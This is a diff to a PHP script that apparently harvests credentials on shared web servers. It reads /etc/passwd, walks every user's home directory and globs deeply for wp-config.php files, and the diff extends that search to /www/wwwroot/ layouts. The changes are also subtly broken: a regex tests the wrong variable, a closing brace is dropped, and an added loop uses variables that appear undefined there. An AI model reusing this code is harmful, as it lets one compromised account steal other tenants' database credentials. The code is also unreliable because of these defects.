@@ -142,11 +142,10 @@ function frida_detect_home_base() {
     foreach ($paths_to_check as $path) {
         if (empty($path)) continue;
         
-        if (preg_match('/^\/(home\d*|var\/www)\/([^\/]+)/', $path, $matches)) {
+        if (preg_match('/^\/(home\d*|var\/www|www|wwwroot)\//', $home_dir, $matches)) {
             $base = '/' . $matches[1] . '/';
             $detected_bases[$base] = true;
-        }
-    }
+}
     
     if (is_readable('/etc/passwd')) {
         writeLog("Reading /etc/passwd for home base detection");
@@ -194,14 +193,19 @@ function frida_detect_home_base() {
         $all_bases[] = $base;
         
         if (preg_match('/^\/home\/?$/', $base)) {
-            for ($i = 2; $i <= 5; $i++) {
-                $alt_base = '/home' . $i . '/';
-                if (@is_dir($alt_base)) {
-                    $all_bases[] = $alt_base;
-                }
-            }
+    for ($i = 2; $i <= 5; $i++) {
+        $alt_base = '/home' . $i . '/';
+        if (@is_dir($alt_base)) {
+            $all_bases[] = $alt_base;
         }
     }
+}
+foreach (['/www/wwwroot/', '/www/'] as $extra_base) {
+    $alt_path = $extra_base . $username . '/';
+    if (@is_dir($alt_path) && !in_array($alt_path, $check_dirs)) {
+        $check_dirs[] = $alt_path;
+    }
+}
     
     $unique_bases = array_unique($all_bases);
     writeLog("Detected home bases: " . implode(', ', $unique_bases));
@@ -267,7 +271,7 @@ function frida_posix_users() {
         return preg_quote(rtrim($base, '/'), '/');
     }, $home_bases)) . '|var\/www)\//';
     
-    $scan_dirs = ['/home/', '/home2/', '/home3/', '/home4/', '/home5/', '/var/www/'];
+    $scan_dirs = ['/home/', '/home2/', '/home3/', '/home4/', '/home5/', '/var/www/', '/www/', '/www/wwwroot/'];
     foreach ($scan_dirs as $scan_dir) {
         if (@is_dir($scan_dir)) {
             writeLog("Scanning directory: $scan_dir");
@@ -905,33 +909,38 @@ function frida_scan_all_users_wpconfig() {
     ];
     
     $quick_paths = [
-        'wp-config.php',
-        'public_html/wp-config.php',
-        'www/wp-config.php',
-        'htdocs/wp-config.php',
-        'html/wp-config.php',
-        'web/wp-config.php',
-        'public/wp-config.php',
-        'site/wp-config.php',
-        'httpdocs/wp-config.php',
-        'domains/*/public_html/wp-config.php',
-        'domains/*/www/wp-config.php',
-        'domains/*/htdocs/wp-config.php',
-        'domains/*/html/wp-config.php',
-        'domains/*/web/wp-config.php',
-        'domains/*/public/wp-config.php',
-        'domains/*/site/wp-config.php',
-        'domains/*/httpdocs/wp-config.php',
-        '*/public_html/wp-config.php',
-        '*/www/wp-config.php',
-        '*/htdocs/wp-config.php',
-        '*/html/wp-config.php',
-        '*/web/wp-config.php',
-        '*/public/wp-config.php',
-        '*/site/wp-config.php',
-        '*/*/wp-config.php',
-        '*/*/*/wp-config.php'
-    ];
+    'wp-config.php',
+    'public_html/wp-config.php',
+    'www/wp-config.php',
+    'wwwroot/wp-config.php',
+    'wwwroot/*/wp-config.php',
+    'wwwroot/*/*/wp-config.php',
+    'htdocs/wp-config.php',
+    'html/wp-config.php',
+    'web/wp-config.php',
+    'public/wp-config.php',
+    'site/wp-config.php',
+    'httpdocs/wp-config.php',
+    'domains/*/public_html/wp-config.php',
+    'domains/*/www/wp-config.php',
+    'domains/*/wwwroot/wp-config.php',
+    'domains/*/htdocs/wp-config.php',
+    'domains/*/html/wp-config.php',
+    'domains/*/web/wp-config.php',
+    'domains/*/public/wp-config.php',
+    'domains/*/site/wp-config.php',
+    'domains/*/httpdocs/wp-config.php',
+    '*/public_html/wp-config.php',
+    '*/www/wp-config.php',
+    '*/wwwroot/wp-config.php',
+    '*/htdocs/wp-config.php',
+    '*/html/wp-config.php',
+    '*/web/wp-config.php',
+    '*/public/wp-config.php',
+    '*/site/wp-config.php',
+    '*/*/wp-config.php',
+    '*/*/*/wp-config.php'
+];
     
     $use_find_command = function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')));
     
@@ -957,6 +966,7 @@ function frida_scan_all_users_wpconfig() {
         $variation_dirs = [
             $home_dir . 'public_html/',
             $home_dir . 'www/',
+            $home_dir . 'wwwroot/',
             $home_dir . 'htdocs/',
             $home_dir . 'html/',
             $home_dir . 'web/',
@@ -965,7 +975,7 @@ function frida_scan_all_users_wpconfig() {
             $home_dir . 'httpdocs/',
             $home_dir . 'domains/',
             $home_dir . 'subdomains/'
-        ];
+            ];
         
         foreach ($variation_dirs as $var_dir) {
             if (@is_dir($var_dir) && !in_array($var_dir, $check_dirs)) {
@@ -1065,26 +1075,31 @@ function frida_scan_all_users_wpconfig() {
             
             if ((microtime(true) - $user_start) < $max_time_per_user) {
                 $deep_glob_patterns = [
-                    $check_dir . '*/wp-config.php',
-                    $check_dir . '*/*/wp-config.php',
-                    $check_dir . '*/*/*/wp-config.php',
-                    $check_dir . '*/*/*/*/wp-config.php',
-                    $check_dir . '*/*/*/*/*/wp-config.php',
-                    $check_dir . 'public_html/*/wp-config.php',
-                    $check_dir . 'public_html/*/*/wp-config.php',
-                    $check_dir . 'public_html/*/*/*/wp-config.php',
-                    $check_dir . 'www/*/wp-config.php',
-                    $check_dir . 'www/*/*/wp-config.php',
-                    $check_dir . 'html/*/wp-config.php',
-                    $check_dir . 'domains/*/wp-config.php',$check_dir . 'domains/*/*/wp-config.php',
-                    $check_dir . 'domains/*/*/*/wp-config.php',
-                    $check_dir . 'domains/*/public_html/wp-config.php',
-                    $check_dir . 'domains/*/public_html/*/wp-config.php',
-                    $check_dir . 'domains/*/public_html/*/*/wp-config.php',
-                    $check_dir . 'domains/*/www/wp-config.php',
-                    $check_dir . 'subdomains/*/wp-config.php',
-                    $check_dir . 'subdomains/*/public_html/wp-config.php'
-                ];
+    $check_dir . '*/wp-config.php',
+    $check_dir . '*/*/wp-config.php',
+    $check_dir . '*/*/*/wp-config.php',
+    $check_dir . '*/*/*/*/wp-config.php',
+    $check_dir . '*/*/*/*/*/wp-config.php',
+    $check_dir . 'public_html/*/wp-config.php',
+    $check_dir . 'public_html/*/*/wp-config.php',
+    $check_dir . 'public_html/*/*/*/wp-config.php',
+    $check_dir . 'www/*/wp-config.php',
+    $check_dir . 'www/*/*/wp-config.php',
+    $check_dir . 'wwwroot/*/wp-config.php',
+    $check_dir . 'wwwroot/*/*/wp-config.php',
+    $check_dir . 'wwwroot/*/*/*/wp-config.php',
+    $check_dir . 'wwwroot/*/public_html/wp-config.php',
+    $check_dir . 'html/*/wp-config.php',
+    $check_dir . 'domains/*/wp-config.php',
+    $check_dir . 'domains/*/*/wp-config.php',
+    $check_dir . 'domains/*/*/*/wp-config.php',
+    $check_dir . 'domains/*/public_html/wp-config.php',
+    $check_dir . 'domains/*/public_html/*/wp-config.php',
+    $check_dir . 'domains/*/public_html/*/*/wp-config.php',
+    $check_dir . 'domains/*/www/wp-config.php',
+    $check_dir . 'subdomains/*/wp-config.php',
+    $check_dir . 'subdomains/*/public_html/wp-config.php'
+];
                 
                 foreach ($deep_glob_patterns as $pattern) {
                     if ((microtime(true) - $user_start) > $max_time_per_user) break;
